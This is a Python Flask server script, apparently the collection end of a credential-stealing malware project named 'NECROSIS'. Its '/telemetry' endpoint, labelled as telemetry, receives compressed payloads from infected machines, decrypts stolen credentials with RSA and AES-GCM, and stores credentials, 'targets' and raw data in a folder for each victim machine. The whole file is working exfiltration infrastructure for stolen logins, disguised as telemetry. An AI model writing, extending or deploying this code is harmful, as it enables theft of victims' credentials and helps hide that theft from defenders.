# server/server.py
from pathlib import Path
import base64
import json
import zlib
import os
import logging
from datetime import datetime, timezone
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

app = Flask(__name__)
PRIVATE_KEY_PATH = Path("keys/private_key.pem")
RECEIVED_DIR = Path("received_data")
RECEIVED_DIR.mkdir(exist_ok=True)
app.config["MAX_CONTENT_LENGTH"] = 100 * 1024 * 1024
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("NECROSIS-SERVER")

def load_private_key():
    if not PRIVATE_KEY_PATH.exists():
        raise FileNotFoundError(f"Clé privée introuvable : {PRIVATE_KEY_PATH}")
    with PRIVATE_KEY_PATH.open("rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)

PRIVATE_KEY = load_private_key()
logger.info("✅ Clé privée RSA chargée")

def decrypt_aes_key(encrypted_key_b64: str) -> bytes:
    encrypted_key = base64.b64decode(encrypted_key_b64)
    aes_key = PRIVATE_KEY.decrypt(
        encrypted_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    if len(aes_key) != 32:
        raise ValueError("Clé AES doit faire 32 octets")
    return aes_key

def decrypt_data(encrypted_data_b64: str, aes_key: bytes) -> bytes:
    encrypted_data = base64.b64decode(encrypted_data_b64)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    aes = AESGCM(aes_key)
    return aes.decrypt(nonce, ciphertext, None)

def save_file(file_name: str, content: bytes, extension: str, folder: Path) -> str:
    folder.mkdir(parents=True, exist_ok=True)
    file_path = folder / f"{file_name}.{extension}"
    with file_path.open("wb") as f:
        f.write(content)
    return str(file_path)

@app.post("/telemetry")
def receive_telemetry():
    logger.info("📨 Requête reçue")
    if not request.is_json:
        return jsonify({"success": False, "error": "Content-Type doit être application/json"}), 400
    try:
        payload = request.get_json()
        if not isinstance(payload, dict) or "data" not in payload:
            return jsonify({"success": False, "error": "Payload invalide"}), 400
        compressed = base64.b64decode(payload["data"])
        decompressed = zlib.decompress(compressed)
        telemetry = json.loads(decompressed.decode('utf-8'))
        logger.info(f"✅ Payload décompressé ({len(decompressed)} octets)")

        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")
        folder_path = RECEIVED_DIR / f"payload_{telemetry['machine_id'][:8]}_{timestamp}"
        folder_path.mkdir(parents=True, exist_ok=True)

        # Déchiffrement
        aes_key = decrypt_aes_key(telemetry["aes_key"])
        creds_json = decrypt_data(telemetry["encrypted_credentials"], aes_key)
        credentials = json.loads(creds_json.decode('utf-8'))
        logger.info(f"✅ {len(credentials)} credentials déchiffrés")

        save_file("credentials", json.dumps(credentials, indent=2).encode('utf-8'), "json", folder_path)
        if "targets" in telemetry:
            save_file("targets", json.dumps(telemetry["targets"], indent=2).encode('utf-8'), "json", folder_path)
        save_file("raw_payload", json.dumps(telemetry, indent=2).encode('utf-8'), "json", folder_path)

        return jsonify({"success": True, "credentials_count": len(credentials)}), 200
    except Exception as e:
        logger.exception("❌ Erreur")
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)